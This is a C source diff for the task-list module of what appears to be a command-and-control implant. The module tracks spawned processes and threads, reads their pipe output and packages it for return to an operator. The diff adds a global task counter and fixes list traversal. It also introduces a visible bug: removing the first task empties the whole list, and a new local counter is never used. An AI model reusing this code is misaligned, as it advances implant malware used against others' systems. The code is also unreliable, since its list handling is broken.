@@ -6,6 +6,8 @@
 #include "../../headers/helpers/win32.h"
 #include "../../headers/package/package.h"
 
+UINT TotalTaskCount = 0;
+
 VOID TaskAdd(DWORD dwRequestID, DWORD dwTaskID, SHORT shTaskType, SHORT shTaskStatus, PVOID pTaskData, HANDLE hTaskHandle) {
 
 
@@ -25,9 +27,9 @@ VOID TaskAdd(DWORD dwRequestID, DWORD dwTaskID, SHORT shTaskType, SHORT shTaskSt
     Task->hTaskHandle = hTaskHandle;
     Task->pNext = NULL;
 
-
     if(agent->TaskList == NULL) {
         agent->TaskList = Task;
+        TotalTaskCount++;
         return;
     }
 
@@ -36,7 +38,7 @@ VOID TaskAdd(DWORD dwRequestID, DWORD dwTaskID, SHORT shTaskType, SHORT shTaskSt
         TaskList = TaskList->pNext;
     }
     TaskList->pNext = Task;
-    agent->TaskList->TaskCount++;
+    TotalTaskCount++;
 }
 
 VOID CheckTasks() {
@@ -55,6 +57,7 @@ VOID CheckTasks() {
 
             case TASK_TYPE_THREAD: {
                 //DO SOMETHING HERE
+                TaskList = TaskList->pNext;
                 break;
             } // case TASK_TYPE_THREAD
 
@@ -67,6 +70,7 @@ VOID CheckTasks() {
                         TaskList->shTaskStatus = TASK_STATUS_STOPPED;
 
                 }
+                TaskList = TaskList->pNext;
                 break;
             } // case TASK_TYPE_PROCESS
 
@@ -82,7 +86,7 @@ VOID CheckTasks() {
                         PVOID Buffer = NULL;
                         DWORD dwBytesRead = 0;
 
-                        PipeRead((PPIPE) TaskList->pTaskData, Buffer, &dwBytesRead);
+                        PipeRead((PPIPE) TaskList->pTaskData, &Buffer, &dwBytesRead);
                         if(dwBytesRead) {
                             pack = CreateDataPackage(SEND_DATA, AGENT_OUTPUT);
                             AddBytesToPackage(pack, Buffer, dwBytesRead);
@@ -112,9 +116,12 @@ VOID CheckTasks() {
                     }
                 }
 
+                TaskList = TaskList->pNext;
+
                 break;
             }
             default:
+                TaskList = TaskList->pNext;
                 break;
 
         } //switch
@@ -126,15 +133,17 @@ VOID TaskRemove(DWORD dwTaskID) {
 
     PTASK TaskList = NULL;
     PTASK TaskToRemove = NULL;
+    INT TaskCount = 0;
 
     TaskList = agent->TaskList;
 
     if(TaskList == NULL)
         return;
 
+    //check if the first task is the one to remove
     if(TaskList->dwTaskID == dwTaskID) {
         TaskToRemove = TaskList;
-        agent->TaskList = TaskList->pNext;
+        agent->TaskList = NULL;
         goto _END;
     }
 
@@ -152,6 +161,8 @@ VOID TaskRemove(DWORD dwTaskID) {
     _END:
     if(!TaskToRemove)
         return;
+
+    TotalTaskCount--;
 
     if(TaskToRemove->hTaskHandle)
         agent->apis->pNtClose(TaskToRemove->hTaskHandle);
